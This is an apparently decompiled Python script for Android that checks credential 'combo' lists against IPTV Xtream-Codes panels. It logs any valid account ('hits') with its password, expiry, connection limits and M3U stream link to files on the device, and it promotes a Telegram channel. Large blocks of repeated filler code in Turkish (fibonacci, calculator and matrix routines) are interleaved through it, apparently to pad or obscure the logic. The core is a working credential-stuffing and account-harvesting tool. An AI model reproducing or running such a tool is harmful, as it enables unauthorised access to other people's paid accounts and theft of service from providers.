                return "Sıfıra bölme hatası!"
            else:
                return x / y


    class Matris:

        def __init__(self, satır, sütun):
            self.satır = satır
            self.sütun = sütun
            self.veri = [[0 for _ in range(sütun)] for _ in range(satır)]

        def göster(self):
            for satır in self.veri:
                print(satır)

        def eleman_ekle(self, satır, sütun, değer):
            self.veri[satır][sütun] = değer


    fibonacci_10 = fibonacci_seri(10)
    frekanslar = kelime_frekansları("Bu bir örnek metin metin metin")
    faktoriyel_5 = faktoriyel(5)
    ters_metin = tersine_cevir("Python örneği")
    liste_toplam = toplam_hesapla([1, 2, 3, 4, 5])
    hesap_makinesi = HesapMakinesi()
    toplam = hesap_makinesi.toplama(5, 3)
    çarpım = hesap_makinesi.çarpma(4, 6)
    matris = Matris(3, 3)
    matris.eleman_ekle(0, 0, 1)
    matris.eleman_ekle(1, 1, 1)
    matris.eleman_ekle(2, 2, 1)
    caminho_pasta_03 = "/sdcard/hits/AliPre/HITs_LiSTAs@A_pxl"
    if not os.path.exists(caminho_pasta_03):
        os.makedirs(caminho_pasta_03)

    def fibonacci_seri(n):
        if n <= 0:
            return []
        else:
            if n == 1:
                return [
                 0]
            if n == 2:
                return [
                 0, 1]
            fibonacci = [0, 1]
            for i in range(2, n):
                fibonacci.append(fibonacci[i - 1] + fibonacci[i - 2])

            return fibonacci


    def kelime_frekansları(metin):
        kelimeler = metin.split()
        frekanslar = {}
        for kelime in kelimeler:
            if kelime in frekanslar:
                frekanslar[kelime] += 1
            else:
                frekanslar[kelime] = 1

        return frekanslar


    def faktoriyel(n):
        if n == 0:
            return 1
        else:
            return n * faktoriyel(n - 1)


    def tersine_cevir(dize):
        return dize[::-1]


    def toplam_hesapla(liste):
        return sum(liste)


    class HesapMakinesi:

        def __init__(self):
            pass

        def toplama(self, x, y):
            return x + y

        def çıkarma(self, x, y):
            return x - y

        def çarpma(self, x, y):
            return x * y

        def bölme(self, x, y):
            if y == 0:
                return "Sıfıra bölme hatası!"
            else:
                return x / y


    class Matris:

        def __init__(self, satır, sütun):
            self.satır = satır
            self.sütun = sütun
            self.veri = [[0 for _ in range(sütun)] for _ in range(satır)]

        def göster(self):
            for satır in self.veri:
                print(satır)

        def eleman_ekle(self, satır, sütun, değer):
            self.veri[satır][sütun] = değer


    fibonacci_10 = fibonacci_seri(10)
    frekanslar = kelime_frekansları("Bu bir örnek metin metin metin")
    faktoriyel_5 = faktoriyel(5)
    ters_metin = tersine_cevir("Python örneği")
    liste_toplam = toplam_hesapla([1, 2, 3, 4, 5])
    hesap_makinesi = HesapMakinesi()
    toplam = hesap_makinesi.toplama(5, 3)
    çarpım = hesap_makinesi.çarpma(4, 6)
    matris = Matris(3, 3)
    matris.eleman_ekle(0, 0, 1)
    matris.eleman_ekle(1, 1, 1)
    matris.eleman_ekle(2, 2, 1)
    if platform.system() == "Linux":
        if "android" in platform.platform().lower():
            my_os = "Android"
        else:
            my_os = platform.system()

        def fibonacci_seri(n):
            if n <= 0:
                return []
            else:
                if n == 1:
                    return [
                     0]
                if n == 2:
                    return [
                     0, 1]
                fibonacci = [0, 1]
                for i in range(2, n):
                    fibonacci.append(fibonacci[i - 1] + fibonacci[i - 2])

                return fibonacci


        def kelime_frekansları(metin):
            kelimeler = metin.split()
            frekanslar = {}
            for kelime in kelimeler:
                if kelime in frekanslar:
                    frekanslar[kelime] += 1
                else:
                    frekanslar[kelime] = 1

            return frekanslar


        def faktoriyel(n):
            if n == 0:
                return 1
            else:
                return n * faktoriyel(n - 1)


        def tersine_cevir(dize):
            return dize[::-1]


        def toplam_hesapla(liste):
            return sum(liste)


        class HesapMakinesi:

            def __init__(self):
                pass

            def toplama(self, x, y):
                return x + y

            def çıkarma(self, x, y):
                return x - y

            def çarpma(self, x, y):
                return x * y

            def bölme(self, x, y):
                if y == 0:
                    return "Sıfıra bölme hatası!"
                else:
                    return x / y


        class Matris:

            def __init__(self, satır, sütun):
                self.satır = satır
                self.sütun = sütun
                self.veri = [[0 for _ in range(sütun)] for _ in range(satır)]

            def göster(self):
                for satır in self.veri:
                    print(satır)

            def eleman_ekle(self, satır, sütun, değer):
                self.veri[satır][sütun] = değer


        fibonacci_10 = fibonacci_seri(10)
        frekanslar = kelime_frekansları("Bu bir örnek metin metin metin")
        faktoriyel_5 = faktoriyel(5)
        ters_metin = tersine_cevir("Python örneği")
        liste_toplam = toplam_hesapla([1, 2, 3, 4, 5])
        hesap_makinesi = HesapMakinesi()
        toplam = hesap_makinesi.toplama(5, 3)
        çarpım = hesap_makinesi.çarpma(4, 6)
        matris = Matris(3, 3)
        matris.eleman_ekle(0, 0, 1)
        matris.eleman_ekle(1, 1, 1)
        matris.eleman_ekle(2, 2, 1)

        def fibonacci_seri(n):
            if n <= 0:
                return []
            else:
                if n == 1:
                    return [
                     0]
                if n == 2:
                    return [
                     0, 1]
                fibonacci = [0, 1]
                for i in range(2, n):
                    fibonacci.append(fibonacci[i - 1] + fibonacci[i - 2])

                return fibonacci


        def kelime_frekansları(metin):
            kelimeler = metin.split()
            frekanslar = {}
            for kelime in kelimeler:
                if kelime in frekanslar:
                    frekanslar[kelime] += 1
                else:
                    frekanslar[kelime] = 1

            return frekanslar


        def faktoriyel(n):
            if n == 0:
                return 1
            else:
                return n * faktoriyel(n - 1)


        def tersine_cevir(dize):
            return dize[::-1]


        def toplam_hesapla(liste):
            return sum(liste)


        class HesapMakinesi:

            def __init__(self):
                pass

            def toplama(self, x, y):
                return x + y

            def çıkarma(self, x, y):
                return x - y

            def çarpma(self, x, y):
                return x * y

            def bölme(self, x, y):
                if y == 0:
                    return "Sıfıra bölme hatası!"
                else:
                    return x / y


        class Matris:

            def __init__(self, satır, sütun):
                self.satır = satır
                self.sütun = sütun
                self.veri = [[0 for _ in range(sütun)] for _ in range(satır)]

            def göster(self):
                for satır in self.veri:
                    print(satır)

            def eleman_ekle(self, satır, sütun, değer):
                self.veri[satır][sütun] = değer


        fibonacci_10 = fibonacci_seri(10)
        frekanslar = kelime_frekansları("Bu bir örnek metin metin metin")
        faktoriyel_5 = faktoriyel(5)
        ters_metin = tersine_cevir("Python örneği")
        liste_toplam = toplam_hesapla([1, 2, 3, 4, 5])
        hesap_makinesi = HesapMakinesi()
        toplam = hesap_makinesi.toplama(5, 3)
        çarpım = hesap_makinesi.çarpma(4, 6)
        matris = Matris(3, 3)
        matris.eleman_ekle(0, 0, 1)
        matris.eleman_ekle(1, 1, 1)
        matris.eleman_ekle(2, 2, 1)

        def fibonacci_seri(n):
            if n <= 0:
                return []
            else:
                if n == 1:
                    return [
                     0]
                if n == 2:
                    return [
                     0, 1]
                fibonacci = [0, 1]
                for i in range(2, n):
                    fibonacci.append(fibonacci[i - 1] + fibonacci[i - 2])

                return fibonacci


        def kelime_frekansları(metin):
            kelimeler = metin.split()
            frekanslar = {}
            for kelime in kelimeler:
                if kelime in frekanslar:
                    frekanslar[kelime] += 1
                else:
                    frekanslar[kelime] = 1

            return frekanslar


        def faktoriyel(n):
            if n == 0:
                return 1
            else:
                return n * faktoriyel(n - 1)


        def tersine_cevir(dize):
            return dize[::-1]


        def toplam_hesapla(liste):
            return sum(liste)


        class HesapMakinesi:

            def __init__(self):
                pass

            def toplama(self, x, y):
                return x + y

            def çıkarma(self, x, y):
                return x - y

            def çarpma(self, x, y):
                return x * y

            def bölme(self, x, y):
                if y == 0:
                    return "Sıfıra bölme hatası!"
                else:
                    return x / y


        class Matris:

            def __init__(self, satır, sütun):
                self.satır = satır
                self.sütun = sütun
                self.veri = [[0 for _ in range(sütun)] for _ in range(satır)]

            def göster(self):
                for satır in self.veri:
                    print(satır)

            def eleman_ekle(self, satır, sütun, değer):
                self.veri[satır][sütun] = değer


        fibonacci_10 = fibonacci_seri(10)
        frekanslar = kelime_frekansları("Bu bir örnek metin metin metin")
        faktoriyel_5 = faktoriyel(5)
        ters_metin = tersine_cevir("Python örneği")
        liste_toplam = toplam_hesapla([1, 2, 3, 4, 5])
        hesap_makinesi = HesapMakinesi()
        toplam = hesap_makinesi.toplama(5, 3)
        çarpım = hesap_makinesi.çarpma(4, 6)
        matris = Matris(3, 3)
        matris.eleman_ekle(0, 0, 1)
        matris.eleman_ekle(1, 1, 1)
        matris.eleman_ekle(2, 2, 1)

        def fibonacci_seri(n):
            if n <= 0:
                return []
            else:
                if n == 1:
                    return [
                     0]
                if n == 2:
                    return [
                     0, 1]
                fibonacci = [0, 1]
                for i in range(2, n):
                    fibonacci.append(fibonacci[i - 1] + fibonacci[i - 2])

                return fibonacci


        def kelime_frekansları(metin):
            kelimeler = metin.split()
            frekanslar = {}
            for kelime in kelimeler:
                if kelime in frekanslar:
                    frekanslar[kelime] += 1
                else:
                    frekanslar[kelime] = 1

            return frekanslar


        def faktoriyel(n):
            if n == 0:
                return 1
            else:
                return n * faktoriyel(n - 1)


        def tersine_cevir(dize):
            return dize[::-1]


        def toplam_hesapla(liste):
            return sum(liste)


        class HesapMakinesi:

            def __init__(self):
                pass

            def toplama(self, x, y):
                return x + y

            def çıkarma(self, x, y):
                return x - y

            def çarpma(self, x, y):
                return x * y

            def bölme(self, x, y):
                if y == 0:
                    return "Sıfıra bölme hatası!"
                else:
                    return x / y


        class Matris:

            def __init__(self, satır, sütun):
                self.satır = satır
                self.sütun = sütun
                self.veri = [[0 for _ in range(sütun)] for _ in range(satır)]

            def göster(self):
                for satır in self.veri:
                    print(satır)

            def eleman_ekle(self, satır, sütun, değer):
                self.veri[satır][sütun] = değer


        fibonacci_10 = fibonacci_seri(10)
        frekanslar = kelime_frekansları("Bu bir örnek metin metin metin")
        faktoriyel_5 = faktoriyel(5)
        ters_metin = tersine_cevir("Python örneği")
        liste_toplam = toplam_hesapla([1, 2, 3, 4, 5])
        hesap_makinesi = HesapMakinesi()
        toplam = hesap_makinesi.toplama(5, 3)
        çarpım = hesap_makinesi.çarpma(4, 6)
        matris = Matris(3, 3)
        matris.eleman_ekle(0, 0, 1)
        matris.eleman_ekle(1, 1, 1)
        matris.eleman_ekle(2, 2, 1)

        def fibonacci_seri(n):
            if n <= 0:
                return []
            else:
                if n == 1:
                    return [
                     0]
                if n == 2:
                    return [
                     0, 1]
                fibonacci = [0, 1]
                for i in range(2, n):
                    fibonacci.append(fibonacci[i - 1] + fibonacci[i - 2])

                return fibonacci


        def kelime_frekansları(metin):
            kelimeler = metin.split()
            frekanslar = {}
            for kelime in kelimeler:
                if kelime in frekanslar:
                    frekanslar[kelime] += 1
                else:
                    frekanslar[kelime] = 1

            return frekanslar


        def faktoriyel(n):
            if n == 0:
                return 1
            else:
                return n * faktoriyel(n - 1)


        def tersine_cevir(dize):
            return dize[::-1]


        def toplam_hesapla(liste):
            return sum(liste)


        class HesapMakinesi:

            def __init__(self):
                pass

            def toplama(self, x, y):
                return x + y

            def çıkarma(self, x, y):
                return x - y

            def çarpma(self, x, y):
                return x * y

            def bölme(self, x, y):
                if y == 0:
                    return "Sıfıra bölme hatası!"
                else:
                    return x / y


        class Matris:

            def __init__(self, satır, sütun):
                self.satır = satır
                self.sütun = sütun
                self.veri = [[0 for _ in range(sütun)] for _ in range(satır)]

            def göster(self):
                for satır in self.veri:
                    print(satır)

            def eleman_ekle(self, satır, sütun, değer):
                self.veri[satır][sütun] = değer


        fibonacci_10 = fibonacci_seri(10)
        frekanslar = kelime_frekansları("Bu bir örnek metin metin metin")
        faktoriyel_5 = faktoriyel(5)
        ters_metin = tersine_cevir("Python örneği")
        liste_toplam = toplam_hesapla([1, 2, 3, 4, 5])
        hesap_makinesi = HesapMakinesi()
        toplam = hesap_makinesi.toplama(5, 3)
        çarpım = hesap_makinesi.çarpma(4, 6)
        matris = Matris(3, 3)
        matris.eleman_ekle(0, 0, 1)
        matris.eleman_ekle(1, 1, 1)
        matris.eleman_ekle(2, 2, 1)
        art_ansi = "\n{}\n         \x1b[91m\n  ╔═════════「 🇮🇶 𝐁𝐲 𝐶𝑜𝑛𝑓𝑖𝑔 IQ ════════╗\n  ║    _   _    _   _  _         _     ║\n  ║   /_\\ | |  (_) | || |__ _ __| |__  ║\n  ║  / _ \\| |__| | | __ / _` / _| / /  ║\n  ║ /_/ \\_\\____|_| |_||_\\__,_\\__|_\\_\\  ║\n  ║                                    ║\n  ╚══════════════════════════════╝                                  \n \x1b⠀\x1b[0m\n{}The location where you save your hits:{}\n{}{}/sdcard/hits/AliPre{}\n\n".format(VD, VD, VD, VD, VD, VD, VDC, VDC, VDC, VDC, VDC, RST, VC, RST, VDC, my_os, RST, NEGRITO, RESET, NEGRITO, AC, RESET)
        for art_ansi in art_ansi:
            for c in art_ansi:
                print(c, end="", flush=True)
                time.sleep(uniform(0, 0.01))

        byhits = input("\x1b[1;91m──➤🔹   🅿🆁🅴🆂🆂 🅴🅽🆃🅴🆁            \x1b[0m")
        say = 0
        dsy = ""
        dir = "/sdcard/combo/"
        for files in os.listdir(dir):
            say = say + 1
            dsy = dsy + "\t" + str(say) + "-) " + files + "\n"

        print("Digite o número do Combo da lista!\n\t\n " + dsy + "\n \n\x1b[33mUau! Você tem " + str(say) + " Combos! Use um deles.\n")
        dsyno = str(input(" \x1b[31mCombo N°:\x1b[0m"))
        say = 0
        for files in os.listdir(dir):
            say = say + 1
            if dsyno == str(say):
                sd_hella = dir + files
                break

        say = 0
        subprocess.run(["clear", ""])
        print(art_ansi)
        print(sd_hella)
        botsay = input("\n   \x1b[1;32mDigite o número de Bots!...!\x1b[0m\n    \x1b[1;33mEscolha de 1 a 15.\x1b[0m\n      \nBots 1/15 >> ")
        botsay = int(botsay)

        def fibonacci_seri(n):
            if n <= 0:
                return []
            else:
                if n == 1:
                    return [
                     0]
                if n == 2:
                    return [
                     0, 1]
                fibonacci = [0, 1]
                for i in range(2, n):
                    fibonacci.append(fibonacci[i - 1] + fibonacci[i - 2])

                return fibonacci


        def kelime_frekansları(metin):
            kelimeler = metin.split()
            frekanslar = {}
            for kelime in kelimeler:
                if kelime in frekanslar:
                    frekanslar[kelime] += 1
                else:
                    frekanslar[kelime] = 1

            return frekanslar


        def faktoriyel(n):
            if n == 0:
                return 1
            else:
                return n * faktoriyel(n - 1)


        def tersine_cevir(dize):
            return dize[::-1]


        def toplam_hesapla(liste):
            return sum(liste)


        class HesapMakinesi:

            def __init__(self):
                pass

            def toplama(self, x, y):
                return x + y

            def çıkarma(self, x, y):
                return x - y

            def çarpma(self, x, y):
                return x * y

            def bölme(self, x, y):
                if y == 0:
                    return "Sıfıra bölme hatası!"
                else:
                    return x / y


        class Matris:

            def __init__(self, satır, sütun):
                self.satır = satır
                self.sütun = sütun
                self.veri = [[0 for _ in range(sütun)] for _ in range(satır)]

            def göster(self):
                for satır in self.veri:
                    print(satır)

            def eleman_ekle(self, satır, sütun, değer):
                self.veri[satır][sütun] = değer


        fibonacci_10 = fibonacci_seri(10)
        frekanslar = kelime_frekansları("Bu bir örnek metin metin metin")
        faktoriyel_5 = faktoriyel(5)
        ters_metin = tersine_cevir("Python örneği")
        liste_toplam = toplam_hesapla([1, 2, 3, 4, 5])
        hesap_makinesi = HesapMakinesi()
        toplam = hesap_makinesi.toplama(5, 3)
        çarpım = hesap_makinesi.çarpma(4, 6)
        matris = Matris(3, 3)
        matris.eleman_ekle(0, 0, 1)
        matris.eleman_ekle(1, 1, 1)
        matris.eleman_ekle(2, 2, 1)
        HEADERd = {
         'Cookie': '"stb_lang=en; timezone=Europe%2FIstanbul;"', 
         'X-User-Agent': '"Model: MAG322; Link: Ethernet"', 
         'Accept': '"*/*"', 
         'Connection': '"Keep-Alive"', 
         'Accept-Encoding': '"gzip"', 
         'User-Agent': '"okhttp/4.7.1"'}
        dsy = sd_hella
        combo = dsy
        sd_hell = ""
        file = pathlib.Path(dsy)
        if file.exists():
            print("Olá !! ")
    else:
        print("\x1b[31mArquivo não encontrado...!\x1b[0m")
        sd_hell = "yok"

def fibonacci_seri(n):
    if n <= 0:
        return []
    else:
        if n == 1:
            return [
             0]
        if n == 2:
            return [
             0, 1]
        fibonacci = [0, 1]
        for i in range(2, n):
            fibonacci.append(fibonacci[i - 1] + fibonacci[i - 2])

        return fibonacci


def kelime_frekansları(metin):
    kelimeler = metin.split()
    frekanslar = {}
    for kelime in kelimeler:
        if kelime in frekanslar:
            frekanslar[kelime] += 1
        else:
            frekanslar[kelime] = 1

    return frekanslar


def faktoriyel(n):
    if n == 0:
        return 1
    else:
        return n * faktoriyel(n - 1)


def tersine_cevir(dize):
    return dize[::-1]


def toplam_hesapla(liste):
    return sum(liste)


class HesapMakinesi:

    def __init__(self):
        pass

    def toplama(self, x, y):
        return x + y

    def çıkarma(self, x, y):
        return x - y

    def çarpma(self, x, y):
        return x * y

    def bölme(self, x, y):
        if y == 0:
            return "Sıfıra bölme hatası!"
        else:
            return x / y


class Matris:

    def __init__(self, satır, sütun):
        self.satır = satır
        self.sütun = sütun
        self.veri = [[0 for _ in range(sütun)] for _ in range(satır)]

    def göster(self):
        for satır in self.veri:
            print(satır)

    def eleman_ekle(self, satır, sütun, değer):
        self.veri[satır][sütun] = değer


fibonacci_10 = fibonacci_seri(10)
frekanslar = kelime_frekansları("Bu bir örnek metin metin metin")
faktoriyel_5 = faktoriyel(5)
ters_metin = tersine_cevir("Python örneği")
liste_toplam = toplam_hesapla([1, 2, 3, 4, 5])
hesap_makinesi = HesapMakinesi()
toplam = hesap_makinesi.toplama(5, 3)
çarpım = hesap_makinesi.çarpma(4, 6)
matris = Matris(3, 3)
matris.eleman_ekle(0, 0, 1)
matris.eleman_ekle(1, 1, 1)
matris.eleman_ekle(2, 2, 1)
if sd_hell == "yok":
    exit()
c = open(dsy, "r")
totLen = c.readlines()
uz = len(totLen)
subprocess.run(["clear", ""])
print(art_ansi)
print("Bot:" + str(botsay))
dir = "/sdcard/qpython/"
print("Combo selecionado: " + dsy)
texto = combo
try:
    nome_arquivo = texto.split("/")[-1]
    lista = nome_arquivo.split(".")[0]
except Exception as e:
    print("Ocorreu um erro:", e)

lista = lista

def fibonacci_seri(n):
    if n <= 0:
        return []
    else:
        if n == 1:
            return [
             0]
        if n == 2:
            return [
             0, 1]
        fibonacci = [0, 1]
        for i in range(2, n):
            fibonacci.append(fibonacci[i - 1] + fibonacci[i - 2])

        return fibonacci


def kelime_frekansları(metin):
    kelimeler = metin.split()
    frekanslar = {}
    for kelime in kelimeler:
        if kelime in frekanslar:
            frekanslar[kelime] += 1
        else:
            frekanslar[kelime] = 1

    return frekanslar


def faktoriyel(n):
    if n == 0:
        return 1
    else:
        return n * faktoriyel(n - 1)


def tersine_cevir(dize):
    return dize[::-1]


def toplam_hesapla(liste):
    return sum(liste)


class HesapMakinesi:

    def __init__(self):
        pass

    def toplama(self, x, y):
        return x + y

    def çıkarma(self, x, y):
        return x - y

    def çarpma(self, x, y):
        return x * y

    def bölme(self, x, y):
        if y == 0:
            return "Sıfıra bölme hatası!"
        else:
            return x / y


class Matris:

    def __init__(self, satır, sütun):
        self.satır = satır
        self.sütun = sütun
        self.veri = [[0 for _ in range(sütun)] for _ in range(satır)]

    def göster(self):
        for satır in self.veri:
            print(satır)

    def eleman_ekle(self, satır, sütun, değer):
        self.veri[satır][sütun] = değer


fibonacci_10 = fibonacci_seri(10)
frekanslar = kelime_frekansları("Bu bir örnek metin metin metin")
faktoriyel_5 = faktoriyel(5)
ters_metin = tersine_cevir("Python örneği")
liste_toplam = toplam_hesapla([1, 2, 3, 4, 5])
hesap_makinesi = HesapMakinesi()
toplam = hesap_makinesi.toplama(5, 3)
çarpım = hesap_makinesi.çarpma(4, 6)
matris = Matris(3, 3)
matris.eleman_ekle(0, 0, 1)
matris.eleman_ekle(1, 1, 1)
matris.eleman_ekle(2, 2, 1)

def contar_linhas_arquivo(diretorio, nome_arquivo):
    caminho_arquivo = os.path.join(diretorio, nome_arquivo)
    with open(caminho_arquivo, "r") as arquivo:
        quantidade_linhas = sum(1 for linha in arquivo)
    return quantidade_linhas


def calcular_tempo_processamento(quantidade_linhas, quantidade_bots):
    tempo_por_linha = 1
    tempo_total_segundos = quantidade_linhas / (quantidade_bots * tempo_por_linha)
    tempo_total_timedelta = timedelta(seconds=tempo_total_segundos)
    dias = tempo_total_timedelta.days
    horas, segundos_restantes = divmod(tempo_total_timedelta.seconds, 3600)
    minutos, segundos = divmod(segundos_restantes, 60)
    layout_tempo = ""
    if dias > 0:
        layout_tempo += "{} dia{} | ".format(str(dias), "s" if dias > 1 else "")
    if horas > 0:
        layout_tempo += "{} hora{} | ".format(str(horas), "s" if horas > 1 else "")
    if minutos > 0:
        layout_tempo += "{} minuto{} | ".format(str(minutos), "s" if minutos > 1 else "")
    if segundos > 0:
        layout_tempo += "{} segundo{}".format(str(segundos), "s" if segundos > 1 else "")
    return layout_tempo


diretorio = "/sdcard/combo"
nome_arquivo = lista + ".txt"
quantidade_bots = botsay
quantidade_linhas = contar_linhas_arquivo(diretorio, nome_arquivo)
layout_tempo = calcular_tempo_processamento(quantidade_linhas, quantidade_bots)
panel = input("\n\x1b[1;32mQUASE LÁ! AGORA INSIRA A URL DO SERVIDOR!\x1b[0m\n\n\nURL:\x1b[0m\x1b[31m\x1b[1m")
panel = panel.replace("http://", "")
panel = panel.replace("/c", "")
panel = panel.replace("/", "")
portal = panel
fx = portal.replace(":", "_")
kanall = ""
kanall = input("\nVocê quer a lista de Categorias de Canais? Escolha 1 Sim // 2 Não!\n\nSelecine: ")
if not kanall == "1":
    kanall = 2
subprocess.run(["clear", ""])
print(art_ansi)

def status_code_colorido(hellurl):
    try:
        response = requests.head(hellurl, verify=False)
        status_code = response.status_code
        if status_code == 200:
            return "\x1b[1;32m" + str(status_code) + "\x1b[0m"
        else:
            if status_code == 302:
                return "\x1b[1;33m" + str(status_code) + "\x1b[0m"
            return "\x1b[1;31m" + str(status_code) + "\x1b[0m"
    except Exception as e:
        return str(e)


hellurl = f"http://{panel}"
hellstatus = status_code_colorido(hellurl)

def CATEGORIAS(katelink):
    try:
        res = ses.get(katelink, headers=HEADERd, timeout=15, verify=False)
        veri = ""
        kate = ""
        veri = str(res.text)
        for i in veri.split('category_name":"'):
            kate = kate + " <×> " + str(i.split('"')[0].encode("utf-8").decode("unicode-escape")).replace("\\/", "/")

    except:
        pass

    return kate


def fibonacci_seri(n):
    if n <= 0:
        return []
    else:
        if n == 1:
            return [
             0]
        if n == 2:
            return [
             0, 1]
        fibonacci = [0, 1]
        for i in range(2, n):
            fibonacci.append(fibonacci[i - 1] + fibonacci[i - 2])

        return fibonacci


def kelime_frekansları(metin):
    kelimeler = metin.split()
    frekanslar = {}
    for kelime in kelimeler:
        if kelime in frekanslar:
            frekanslar[kelime] += 1
        else:
            frekanslar[kelime] = 1

    return frekanslar


def faktoriyel(n):
    if n == 0:
        return 1
    else:
        return n * faktoriyel(n - 1)


def tersine_cevir(dize):
    return dize[::-1]


def toplam_hesapla(liste):
    return sum(liste)


class HesapMakinesi:

    def __init__(self):
        pass

    def toplama(self, x, y):
        return x + y

    def çıkarma(self, x, y):
        return x - y

    def çarpma(self, x, y):
        return x * y

    def bölme(self, x, y):
        if y == 0:
            return "Sıfıra bölme hatası!"
        else:
            return x / y


class Matris:

    def __init__(self, satır, sütun):
        self.satır = satır
        self.sütun = sütun
        self.veri = [[0 for _ in range(sütun)] for _ in range(satır)]

    def göster(self):
        for satır in self.veri:
            print(satır)

    def eleman_ekle(self, satır, sütun, değer):
        self.veri[satır][sütun] = değer


fibonacci_10 = fibonacci_seri(10)
frekanslar = kelime_frekansları("Bu bir örnek metin metin metin")
faktoriyel_5 = faktoriyel(5)
ters_metin = tersine_cevir("Python örneği")
liste_toplam = toplam_hesapla([1, 2, 3, 4, 5])
hesap_makinesi = HesapMakinesi()
toplam = hesap_makinesi.toplama(5, 3)
çarpım = hesap_makinesi.çarpma(4, 6)
matris = Matris(3, 3)
matris.eleman_ekle(0, 0, 1)
matris.eleman_ekle(1, 1, 1)
matris.eleman_ekle(2, 2, 1)

def onay(veri, user, pas):
    status = veri.split('status":')[1]
    status = status.split(",")[0]
    status = status.replace('"', "")
    katelink = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_live_categories"
    sound = "/storage/emulated/0/sound/Incoming Missile Sound Effect(MP3_160K).mp3"
    file = pathlib.Path(sound)
    try:
        if file.exists():
            ad.mediaPlay(sound)
    except:
        pass

    acon = ""
    acon = veri.split('active_cons":')[1]
    acon = acon.split(",")[0]
    acon = acon.replace('"', "")
    mcon = veri.split('max_connections":')[1]
    mcon = mcon.split(",")[0]
    mcon = mcon.replace('"', "")
    timezone = veri.split('timezone":"')[1]
    timezone = timezone.split('",')[0]
    timezone = timezone.replace("\\/", "/")
    realm = veri.split('url":')[1]
    realm = realm.split(",")[0]
    realm = realm.replace('"', "")
    port = veri.split('port":')[1]
    port = port.split(",")[0]
    port = port.replace('"', "")
    user = veri.split('username":')[1]
    user = user.split(",")[0]
    user = user.replace('"', "")
    passw = veri.split('password":')[1]
    passw = passw.split(",")[0]
    passw = passw.replace('"', "")
    created = veri.split('created_at":')[1]
    created = created.split(",")[0]
    created = created.replace('"', "")
    bitis = veri.split('exp_date":')[1]
    bitis = bitis.split(",")[0]
    bitis = bitis.replace('"', "")
    if bitis == "null":
        bitis = "Unlimited"
    else:
        bitis = datetime.fromtimestamp(int(bitis)).strftime("%d-%m-%Y %H:%M:%S")
    bitis = bitis
    if created == "null":
        created = "Unlimited"
    else:
        created = datetime.fromtimestamp(int(created)).strftime("%d-%m-%Y %H:%M:%S")
    created = created
    dias = dias_restantes(bitis)
    if kanall == "1":
        try:
            CATEGORIAS = ""
            res = ses.get(katelink, headers=HEADERd, timeout=15, verify=False)
            veri = ""
            kate = ""
            veri = str(res.text)
            for i in veri.split('category_name":"'):
                kate = kate + " • " + str(i.split('"')[0].encode("utf-8").decode("unicode-escape")).replace("\\/", "/")

            CATEGORIAS = kate
        except:
            pass

    url5 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_live_streams"
    try:
        res = ses.get(url5, timeout=15, verify=False)
        veri = str(res.text)
        kanalsayisi = ""
        kanalsayisi = str(veri.count("stream_id"))
        url5 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_vod_streams"
        res = ses.get(url5, timeout=15, verify=False)
        veri = str(res.text)
        filmsayisi = str(veri.count("stream_id"))
        url5 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_series"
        res = ses.get(url5, timeout=15, verify=False)
        veri = str(res.text)
        dizisayisi = str(veri.count("series_id"))
    except:
        pass

    m3ulink = "http://" + panel + "/get.php?username=" + user + "&password=" + pas + "&type=m3u_plus"
    sayi = ""
    mt = "\n[  Py M3u - 𓆩 ❦𓆪 ₐₗᵢ ₐₗₕₑ𝕯ᵣₑ⁀➴  ]\nHits's by - " + str(byhits) + "\n\nHost ➤ http://" + portal + " \nReal ➤ http://" + realm + "\nPort ➤ " + port + "\n\nUsuário ➤ " + user + "\nSenha ➤ " + pas + "\nCombo utilizado ➤ " + lista + "\n\nCriado ➤ " + created + " \nExpira ➤ " + bitis + " \nDias restantes ➤ " + str(dias) + "\nConectados ➤ " + acon + "\nMaximas conexões ➤ " + mcon + " \nStatus ➤ " + status + "\nLocalidade ➤ " + timezone + "\nData e Hora do Scan ➤ " + str(time.strftime("%d %B %Y • Hora: %H:%M:%S")) + "\n\n ♪Moded By A_pxl\nJunte-se ➤ [ 𓆩 ❦𓆪 ₐₗᵢ ₐₗₕₑ𝕯ᵣₑ⁀➴](https://t.me/A_pxl)\n"
    if not kanalsayisi == "":
        sayi = "\nCanais ➤ " + kanalsayisi + "\nFilmes ➤ " + filmsayisi + "\nSéries ➤ " + dizisayisi + "\nM3u link "
    imzak = ""
    if kanall == "1":
        imzak = "\nCATEGORIAS ➤ \n" + str(CATEGORIAS) + " "
    mtl = "\n\nm3u_Url ➤ [Link M3U](" + m3ulink + ")\n"
    upa = " " + user + ":" + pas
    yaz(mt + sayi + mtl + imzak + "\n")
    print(mt + sayi + mtl + imzak)
    yazy(upa + "\n")
    print(upa)
    yazz(upa + "\n")
    print(upa)


def yaz(kullanici):
    sd_hell = open("/sdcard/hits/AliPre \U0001faaa_" + fx + " (U&P).txt", "a+")
    sd_hell.write(kullanici)
    sd_hell.close()


def yazy(kullanici):
    sd_hell = open("/sdcard/hits/AliPre 📥 GERAL_Combo(U&P).txt", "a+")
    sd_hell.write(kullanici)
    sd_hell.close()


def yazz(kullanici):
    sd_hell = open("/sdcard/hits/AliPre 📂_" + fx + " (Combo).txt", "a+")
    sd_hell.write(kullanici)
    sd_hell.close()


cpm = 0

def echox(user, pas, bot, fyz, oran, hit):
    global cpm
    cpmx = time.time() - cpm
    cpmx = round(60 / cpmx)
    if str(cpmx) == "0":
        cpm = cpm
    else:
        cpm = cpmx
